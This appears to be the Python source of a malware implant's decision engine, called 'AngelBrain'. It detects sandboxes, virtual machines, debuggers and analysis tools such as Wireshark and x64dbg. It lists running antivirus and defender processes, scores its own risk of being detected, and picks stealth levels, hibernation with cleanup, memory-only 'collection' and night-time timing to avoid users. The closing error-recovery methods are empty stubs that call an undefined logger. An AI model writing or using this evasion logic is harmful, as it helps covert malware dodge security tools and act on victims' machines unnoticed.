import os
import time
import random
import threading
import json
import numpy as np
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

class BehaviorAnalyzer:
    def __init__(self):
        self.scaler = StandardScaler()
        self.model = IsolationForest(contamination=0.1, random_state=42)
        self.behavior_history = []
        
    def analyze(self, metrics: Dict) -> Tuple[float, bool]:
        """Analyze behavior and detect anomalies"""
        features = self._extract_features(metrics)
        self.behavior_history.append(features)
        
        # Keep last 1000 samples
        if len(self.behavior_history) > 1000:
            self.behavior_history.pop(0)
            
        # Train model when we have enough data
        if len(self.behavior_history) >= 100:
            X = np.array(self.behavior_history)
            X_scaled = self.scaler.fit_transform(X)
            self.model.fit(X_scaled)
            
            # Get anomaly score
            current_scaled = self.scaler.transform([features])
            score = self.model.score_samples(current_scaled)[0]
            is_anomaly = score < -0.5
            
            return score, is_anomaly
            
        return 0.0, False
        
    def _extract_features(self, metrics: Dict) -> List[float]:
        """Extract behavioral features from metrics"""
        return [
            metrics.get('cpu_usage', 0),
            metrics.get('memory_usage', 0),
            metrics.get('disk_usage', 0),
            metrics.get('network_bytes_sent', 0) / 1024,  # KB
            metrics.get('network_bytes_recv', 0) / 1024,  # KB
            len(metrics.get('processes', [])),
            sum(p.get('cpu', 0) for p in metrics.get('processes', [])),
            sum(p.get('memory', 0) for p in metrics.get('processes', [])),
            1 if metrics.get('user_active', False) else 0
        ]

class SandboxDetector:
    def __init__(self):
        self.vm_indicators = [
            'VirtualBox',
            'VMware',
            'QEMU',
            'Xen',
            'Parallels',
            'Virtual',
            'VBOX',
            'VMWARE'
        ]
        self.sandbox_processes = [
            'wireshark',
            'procmon',
            'procexp',
            'ida',
            'x64dbg',
            'ollydbg',
            'pestudio',
            'processhacker'
        ]
        
    def check_environment(self) -> Dict[str, bool]:
        """Check for signs of sandbox/VM environment"""
        import psutil
        
        results = {
            'is_vm': False,
            'is_monitored': False,
            'has_debugger': False
        }
        
        # Check running processes
        for proc in psutil.process_iter(['name']):
            try:
                name = proc.info['name'].lower()
                # Check for VM
                for indicator in self.vm_indicators:
                    if indicator.lower() in name:
                        results['is_vm'] = True
                        
                # Check for monitoring tools
                for tool in self.sandbox_processes:
                    if tool in name:
                        results['is_monitored'] = True
            except:
                continue
                
        # Check for debugger
        try:
            import ctypes
            results['has_debugger'] = ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            pass
            
        return results

class AngelBrain:
    def __init__(self):
        self.state = {
            'environment': {},
            'security_level': 0,
            'user_activity': 0,
            'system_load': 0,
            'detection_risk': 0,
            'last_analysis': 0,
            'behavior_score': 0.0,
            'is_anomaly': False
        }
        self.rules = self._load_default_rules()
        self.behavior_analyzer = BehaviorAnalyzer()
        self.sandbox_detector = SandboxDetector()
        self.learning_data = []
        self.active = True
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self._monitor_loop)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
    def _load_default_rules(self) -> dict:
        """Load default decision rules"""
        return {
            'max_security_level': 5,
            'max_user_activity': 10,
            'risk_thresholds': {
                'low': 0.3,
                'medium': 0.6,
                'high': 0.8
            },
            'timing_rules': {
                'min_delay': 1,
                'max_delay': 300,
                'user_active_delay': 60,
                'high_risk_delay': 600
            },
            'activity_weights': {
                'cpu_usage': 0.2,
                'memory_usage': 0.2,
                'disk_activity': 0.2,
                'network_activity': 0.2,
                'behavior_score': 0.2
            }
        }
        
    def analyze_environment(self) -> dict:
        """Analyze current system environment"""
        import psutil
        
        try:
            # System metrics
            cpu_percent = psutil.cpu_percent()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            network = psutil.net_io_counters()
            
            # Process analysis
            processes = []
            for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_percent']):
                try:
                    pinfo = proc.info
                    processes.append({
                        'name': pinfo['name'],
                        'cpu': pinfo['cpu_percent'],
                        'memory': pinfo['memory_percent']
                    })
                except:
                    continue
                    
            # User activity detection
            user_active = self._detect_user_activity()
            
            # Security software detection
            security_software = self._detect_security_software()
            
            # Environment data
            env_data = {
                'timestamp': time.time(),
                'cpu_usage': cpu_percent,
                'memory_usage': memory.percent,
                'disk_usage': disk.percent,
                'network_bytes_sent': network.bytes_sent,
                'network_bytes_recv': network.bytes_recv,
                'processes': processes,
                'user_active': user_active,
                'security_software': security_software
            }
            
            # Analyze behavior
            behavior_score, is_anomaly = self.behavior_analyzer.analyze(env_data)
            env_data['behavior_score'] = behavior_score
            env_data['is_anomaly'] = is_anomaly
            
            # Check for sandbox/VM
            env_data['sandbox_check'] = self.sandbox_detector.check_environment()
            
            # Update state
            self.state['environment'] = env_data
            self.state['behavior_score'] = behavior_score
            self.state['is_anomaly'] = is_anomaly
            
            # Calculate risk metrics
            self._calculate_risk_metrics()
            
            return self.state['environment']
            
        except Exception as e:
            return {}
            
    def _detect_user_activity(self) -> bool:
        """Detect if user is actively using the system"""
        import win32api
        try:
            # Check last input time
            last_input = win32api.GetLastInputInfo()
            idle_time = (win32api.GetTickCount() - last_input) / 1000.0
            return idle_time < 60  # Consider user active if less than 1 minute idle
        except:
            return False
            
    def _detect_security_software(self) -> List[str]:
        """Detect running security software"""
        security_software = []
        security_processes = [
            'antivirus', 'defender', 'firewall', 'security', 'protection',
            'safeguard', 'guard', 'monitor', 'surveillance'
        ]
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                try:
                    if any(s in proc.info['name'].lower() for s in security_processes):
                        security_software.append(proc.info['name'])
                except:
                    continue
        except:
            pass
            
        return security_software
        
    def _calculate_risk_metrics(self):
        """Calculate various risk metrics"""
        env = self.state['environment']
        
        # Base risk from system metrics
        system_risk = (
            env['cpu_usage'] * self.rules['activity_weights']['cpu_usage'] +
            env['memory_usage'] * self.rules['activity_weights']['memory_usage'] +
            env['disk_usage'] * self.rules['activity_weights']['disk_activity'] +
            env['network_bytes_sent'] * self.rules['activity_weights']['network_activity'] +
            env['behavior_score'] * self.rules['activity_weights']['behavior_score']
        ) / 100.0
        
        # Risk from security software
        security_risk = len(env['security_software']) * 0.2
        
        # Risk from user activity
        activity_risk = 0.5 if env['user_active'] else 0.1
        
        # Combined risk
        total_risk = (system_risk + security_risk + activity_risk) / 3
        self.state['detection_risk'] = min(1.0, total_risk)
        
    def make_decision(self, context: dict) -> dict:
        """Make decision based on current state and context"""
        decision = {
            'action': None,
            'parameters': {},
            'timing': {},
            'stealth_level': 0
        }
        
        try:
            # Update state if needed
            if time.time() - self.state['last_analysis'] > 60:
                self.analyze_environment()
                
            # Determine stealth level
            if self.state['detection_risk'] > self.rules['risk_thresholds']['high']:
                decision['stealth_level'] = 3  # Maximum stealth
            elif self.state['detection_risk'] > self.rules['risk_thresholds']['medium']:
                decision['stealth_level'] = 2  # High stealth
            else:
                decision['stealth_level'] = 1  # Normal stealth
                
            # Determine timing
            if self.state['environment'].get('user_active', False):
                delay = random.uniform(
                    self.rules['timing_rules']['user_active_delay'],
                    self.rules['timing_rules']['max_delay']
                )
            else:
                delay = random.uniform(
                    self.rules['timing_rules']['min_delay'],
                    self.rules['timing_rules']['max_delay']
                )
                
            decision['timing'] = {
                'delay': delay,
                'best_time': self._calculate_best_time()
            }
            
            # Determine action based on context and risk
            decision.update(self._decide_action(context))
            
            # Learn from decision
            self._learn_from_decision(decision)
            
            return decision
            
        except Exception as e:
            # Return safe default decision
            return {
                'action': 'wait',
                'parameters': {},
                'timing': {'delay': 300},
                'stealth_level': 3
            }
            
    def _decide_action(self, context: dict) -> dict:
        """Decide specific action based on context"""
        action_decision = {
            'action': None,
            'parameters': {}
        }
        
        # High risk situation
        if self.state['detection_risk'] > self.rules['risk_thresholds']['high']:
            action_decision['action'] = 'hibernate'
            action_decision['parameters'] = {
                'duration': random.uniform(3600, 7200),  # 1-2 hours
                'cleanup': True
            }
            
        # Medium risk situation
        elif self.state['detection_risk'] > self.rules['risk_thresholds']['medium']:
            if context.get('type') == 'collection':
                action_decision['action'] = 'minimal_collection'
                action_decision['parameters'] = {
                    'avoid_disk': True,
                    'memory_only': True
                }
            else:
                action_decision['action'] = 'passive_mode'
                
        # Low risk situation
        else:
            action_decision['action'] = context.get('type', 'wait')
            action_decision['parameters'] = context.get('parameters', {})
            
        return action_decision
        
    def _calculate_best_time(self) -> float:
        """Calculate best time for next action"""
        try:
            # Get current hour
            current_hour = datetime.now().hour
            
            # Define optimal hours (typically night time)
            optimal_hours = range(1, 5)  # 1 AM to 4 AM
            
            if current_hour in optimal_hours:
                return time.time()  # Now is good
            else:
                # Calculate time until next optimal hour
                next_optimal = min(optimal_hours, key=lambda x: (x - current_hour) % 24)
                hours_until_optimal = (next_optimal - current_hour) % 24
                return time.time() + (hours_until_optimal * 3600)
                
        except:
            return time.time() + 3600  # Default to 1 hour from now
            
    def _learn_from_decision(self, decision: dict):
        """Learn from decision outcomes"""
        try:
            self.learning_data.append({
                'timestamp': time.time(),
                'state': self.state.copy(),
                'decision': decision,
                'outcome': None  # To be updated later
            })
            
            # Keep learning data manageable
            if len(self.learning_data) > 1000:
                self.learning_data = self.learning_data[-1000:]
                
        except:
            pass
            
    def _monitor_loop(self):
        """Continuous monitoring loop"""
        while self.active:
            try:
                self.analyze_environment()
                time.sleep(60)  # Check every minute
            except:
                time.sleep(300)  # On error, wait longer
                
    def update_rules(self, new_rules: dict):
        """Update decision rules"""
        self.rules.update(new_rules)
        
    def get_state(self) -> dict:
        """Get current state"""
        return self.state.copy()
        
    def shutdown(self):
        """Shutdown brain"""
        self.active = False
        if hasattr(self, 'monitor_thread'):
            self.monitor_thread.join()
            
    def handle_process_error(self, error_info: Dict):
        """Gère les erreurs de processus avec résilience"""
        try:
            # Sauvegarde l'état actuel
            self._save_state()
            
            # Nettoie les ressources
            self._cleanup_resources()
            
            # Réinitialise les analyseurs
            self._reset_analyzers()
            
            # Restaure l'état précédent
            self._restore_state()
            
        except Exception as e:
            self.logger.error(f"Process error recovery failed: {str(e)}")
            
    def _save_state(self):
        # Sauvegarde l'état actuel
        pass
        
    def _cleanup_resources(self):
        # Nettoie les ressources
        pass
        
    def _reset_analyzers(self):
        # Réinitialise les analyseurs
        pass
        
    def _restore_state(self):
        # Restaure l'état précédent
        pass
